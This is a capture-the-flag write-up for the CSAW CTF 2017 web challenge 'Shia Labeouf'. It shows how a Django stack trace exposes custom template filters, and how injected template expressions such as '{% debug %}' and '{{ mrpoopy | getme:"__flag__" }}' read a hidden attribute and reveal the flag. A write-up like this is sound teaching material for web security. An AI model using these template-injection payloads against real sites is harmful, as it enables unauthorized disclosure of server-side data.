# CSAWCTF_2017: Shia Labeouf

**Category:** Web
**Points:** 150
**Description:**

>Do it
Just do it
Don't let your dreams be dreams
Yesterday you said tomorrow
So just do it
Make your dreams come true
Just do it
Pick 1: http://web.chal.csaw.io:5487 http://web.chal.csaw.io:5488 http://web.chal.csaw.io:5489 http://web.chal.csaw.io:5490

## Write-up
This challenge was quite tricky, testing upon the tenancity and patience of challengers. The first step to solving this would be to understand Django's templating language. The second step was to discover the additional filters on `ad-lib`, by invoking a stacktrace by visiting a wrong URL, like http://web.chal.csaw.io:5487/polls/3/. This gives us an idea of what we have at our disposal.

    @register.filter(name='getme')
    def getme(value, arg):
      return getattr(value, arg)
    @register.filter(name='checknum')
    def checknum(value):
      check(value) ...
    @register.filter(name='listme')
    def listme(value):
      return dir(value)
    def check(value):

So now we have a bunch of functions we can use to display values, let's try and see what we are given. Entering `{% debug %}` on `ad-lib/` gives us a debug page, with a suspicious variable `mrpoopy`. Let's try using the functions we received earlier to debug it.

    {% raw %}
    {{ mrpoopy | listme }}
    ['Woohoo', '__doc__', '__flag__', '__module__']
    {% endraw %}

This gives us a variable `__flag__`? Let's try printing that out!
 
    {% raw %}
    {{ mrpoopy | getme:"__flag__" }}
    flag{wow_much_t3mplate}
    {% endraw %}

Therefore, the flag is `flag{wow_much_t3mplate}`.
